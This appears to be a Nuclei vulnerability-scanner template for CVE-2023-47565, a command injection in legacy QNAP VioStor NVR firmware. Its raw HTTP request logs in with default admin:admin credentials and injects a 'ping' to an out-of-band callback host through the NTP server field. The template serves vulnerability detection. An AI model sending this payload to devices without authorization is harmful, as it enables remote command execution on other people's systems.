id: CVE-2023-47565

info:
  name: CVE-2023-47565
  author: Saad Piranha
  severity: high
  description: An OS command injection vulnerability has been found to affect legacy QNAP VioStor NVR models running QVR Firmware 4.x. If exploited, the vulnerability could allow authenticated users to execute commands via a network.
  remediation: |
    Update to versions: QVR Firmware 5.0.0 or later
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2023-47565
    cwe-id: CWE-78
  tags: QNAP, http.nvr, cve-2023-47565

http:
  - raw:
      - |
        POST /cgi-bin/server/server.cgi?func=server02_main_submit&counter=8.540406879901406&APPLY=+ HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Authorization: Basic YWRtaW46YWRtaW4=
        Content-Type: application/x-www-form-urlencoded

        time_mode=2&time_YEAR=0&time_MONTH=0&time_DAY=0&time_HOUR=0&time_MINUTE=0&time_SECOND=0&enable_rtc=1&TIMEZONE=50&year=&month=&day=&CONFIGURE_NTP=on&SPECIFIC_SERVER=ping+{{interactsh-url}}

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the dns Interaction
        words:
          - "dns"
